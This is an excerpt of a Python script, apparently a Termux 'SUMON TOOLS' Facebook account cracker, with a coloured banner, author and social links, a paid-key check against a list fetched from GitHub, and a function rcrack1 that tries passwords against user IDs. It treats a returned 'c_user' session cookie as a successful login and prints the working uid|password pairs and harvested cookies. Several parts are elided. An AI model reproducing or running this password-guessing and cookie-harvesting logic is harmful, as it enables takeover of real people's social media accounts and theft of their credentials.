...
███████║╚██████╔╝██║ ╚═╝ ██║╚██████╔╝██║ ╚████║
╚══════╝ ╚═════╝ ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝                                           
\033[1;91m\033[1;41m\033[1;97m              WELCOME TO SUMON TOOLS               \033[;0m\033[1;91m\033[1;92m

\033[1;92m══════════════════════════════════════════
\033[1;32m[-] TOOLS TYPE:\033[1;32m PREMIUM
\033[1;32m[-] VERSION   :\033[1;32m 3.0
\033[1;32m[-] AUTHOR    :\033[1;32m SADMAN SUMON SNIGDHO 
\033[1;32m[-] GITHUB    :\033[1;32m SUMON-CYBER-143
\033[1;32m[-] FACEBOOK  :\033[1;32m Mahmudul Hasan Sumon 
\033[1;92m══════════════════════════════════════════
\033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS SUMON BRAND\033[;0m\033[1;91m═══>\033[1;92m"""
linex=('\033[1;31m══════════════════════════════════════════')   
try:
...
a=requests.get("https://github.com/Hjdhbv/Paid-Random/blob/main/Aprobal.txt").text
b=str(a)
key1=open("/storage/emulated/0/android8.txt",'r').read()
key2=str(key1)  
if key2 in b:
    ...
    print("Your key  : "+key2)
    print("\n\t\tContact Admin ")
    os.system('xdg-open https://wa.me/+8801761426734')
    exit()
class Main:
    def __init__(self):
        self.id = []
        ...
        os.system("clear")
        print(logo)
        os.system('xdg-open https://www.facebook.com/profile.php?id=100055859781950')
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;31m[%sSUMON\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f"\033[38;5;46m[SUMON-OK💚] {uid}|{ps}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
               # print(f"\x1b[38;5;196m[SUMON-CP💔] {uid}|{ps}")
